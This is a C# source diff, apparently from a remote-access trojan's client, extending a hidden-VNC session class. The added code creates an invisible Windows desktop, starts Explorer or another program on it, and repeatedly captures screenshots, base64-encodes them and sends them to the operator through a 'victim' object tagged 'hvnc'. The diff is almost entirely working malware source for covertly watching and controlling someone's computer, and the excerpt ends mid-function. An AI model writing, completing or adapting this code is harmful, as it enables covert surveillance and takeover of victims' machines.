@@ -8,15 +8,20 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 using System.IO;
+using System.Threading;
 
 namespace winClient48
 {
     public class clsfnHvncSession : IDisposable
     {
+        private clsVictim m_victim;
+
         private IntPtr m_hDesktop;
-        private string m_szDesktopName;
+        public string m_szDesktopName;
         private IntPtr m_hLastWnd;
+
         private bool m_disposed = false;
+        public bool m_bRunning = false;
 
         private const uint GENERIC_ALL = 0x10000000;
         private const int UOI_NAME = 2;
@@ -24,13 +29,26 @@ namespace winClient48
         private const int SW_MAXIMIZE = 3;
         private const uint PW_RENDERFULLCONTENT = 0x00000002;
 
-        public clsfnHvncSession(string szDesktopName)
+        private Size m_Resolution = new Size(0, 0);
+
+
+        public clsfnHvncSession(clsVictim victim, string szDesktopName)
         {
+            m_victim = victim;
             m_szDesktopName = szDesktopName;
             m_hDesktop = WinAPI.CreateDesktop(szDesktopName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
+            m_Resolution = fnGetResolution();
 
             if (m_hDesktop == IntPtr.Zero)
                 throw new Exception("Create window failed.");
+        }
+
+        private Size fnGetResolution()
+        {
+            int nWidth = WinAPI.GetSystemMetrics(0);
+            int nHeight = WinAPI.GetSystemMetrics(1);
+
+            return new Size(nWidth, nHeight);
         }
 
         private IntPtr GetDeepestChild(IntPtr hWndParent, int x, int y)
@@ -49,18 +67,18 @@ namespace winClient48
             return hWndParent;
         }
 
-        public void fnStartExplorer()
+        public void fnCreate(string szExe = "explorer.exe /separate")
         {
             WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
             si.lpDesktop = m_szDesktopName;
-            si.dwFlags = 0x00000001;
-            si.wShowWindow = (short)SW_MAXIMIZE;
+            //si.dwFlags = 0x00000001;
+            //si.wShowWindow = (short)SW_MAXIMIZE;
 
             WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();
 
             //"explorer.exe /separate"
-            StringBuilder sb = new StringBuilder("explorer.exe /separate");
+            StringBuilder sb = new StringBuilder(szExe);
 
             bool success = WinAPI.CreateProcess(
                 null,
@@ -82,9 +100,33 @@ namespace winClient48
             }
         }
 
-        public Bitmap fnGetScreenshot(int nWidth, int nHeight)
+        public void fnStart(int nDelay)
+        {
+            while (m_bRunning)
+            {
+                Bitmap bmp = fnGetScreenshot();
+                string b64 = clsGlobal.BitmapToBase64(bmp);
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "window",
+                    "start",
+                    b64,
+                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
+                });
+
+                Thread.Sleep(nDelay);
+            }
+        }
+
+        public Bitmap fnGetScreenshot()
         {
             WinAPI.SetThreadDesktop(m_hDesktop);
+
+            Size size = m_Resolution;
+            int nWidth = size.Width;
+            int nHeight = size.Height;
 
             Bitmap bmp = new Bitmap(nWidth, nHeight, PixelFormat.Format32bppPArgb);
             using (Graphics g = Graphics.FromImage(bmp))
